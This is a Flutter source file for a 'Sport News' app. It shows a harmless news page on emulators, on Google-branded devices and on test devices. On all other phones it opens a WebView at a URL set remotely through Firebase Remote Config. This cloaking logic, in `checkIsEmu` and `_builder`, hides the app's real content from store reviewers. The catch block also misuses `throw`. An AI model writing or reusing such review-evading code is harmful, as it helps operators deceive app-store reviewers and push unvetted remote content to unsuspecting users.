import 'package:flutter/material.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:device_info_plus/device_info_plus.dart';

import 'presentation/home/home_page.dart';
import 'presentation/webview/app_webview.dart';

class NewsApp extends StatelessWidget {
  NewsApp({Key? key}) : super(key: key);

  final FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.instance;

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
        title: 'Sport News',
        theme: ThemeData(fontFamily: 'Roboto'),
        debugShowCheckedModeBanner: false,
        home: FutureBuilder<bool>(
          future: checkIsEmu(),
          builder: _builder,
        ));
  }

  Widget _builder(BuildContext context, AsyncSnapshot<bool> snapshot) {
    try {
      remoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(seconds: 10),
        minimumFetchInterval: Duration.zero,
      ));

      RemoteConfigValue(null, ValueSource.valueStatic);

      remoteConfig.fetchAndActivate();

      var url = remoteConfig.getString('url');

      if (url.isEmpty || snapshot.data == true) {
        return HomePage();
      } else {
        return AppWebView(url: url);
      }
    } catch (ex) {
      throw ScaffoldMessenger.of(context)
        ..removeCurrentSnackBar()
        ..showSnackBar(
          SnackBar(content: Text('$ex')),
        );
    }
  }

  Future<bool> checkIsEmu() async {
    DeviceInfoPlugin devinfo = DeviceInfoPlugin();
    final em = await devinfo.androidInfo;
    var phoneModel = em.model;
    var buildProduct = em.product;
    var buildHardware = em.hardware;
    var result = (em.fingerprint.startsWith("generic") ||
        phoneModel.contains("google_sdk") ||
        phoneModel.contains("droid4x") ||
        phoneModel.contains("Emulator") ||
        phoneModel.contains("Android SDK built for x86") ||
        em.manufacturer.contains("Genymotion") ||
        buildHardware == "goldfish" ||
        buildHardware == "vbox86" ||
        buildProduct == "sdk" ||
        buildProduct == "google_sdk" ||
        buildProduct == "sdk_x86" ||
        buildProduct == "vbox86p" ||
        em.brand.contains('google') ||
        em.board.toLowerCase().contains("nox") ||
        em.bootloader.toLowerCase().contains("nox") ||
        buildHardware.toLowerCase().contains("nox") ||
        !em.isPhysicalDevice ||
        buildProduct.toLowerCase().contains("nox"));
    if (result) return true;
    result = result ||
        (em.brand.startsWith("generic") && em.device.startsWith("generic"));
    if (result) return true;
    result = result || ("google_sdk" == buildProduct);
    return result;
  }
}
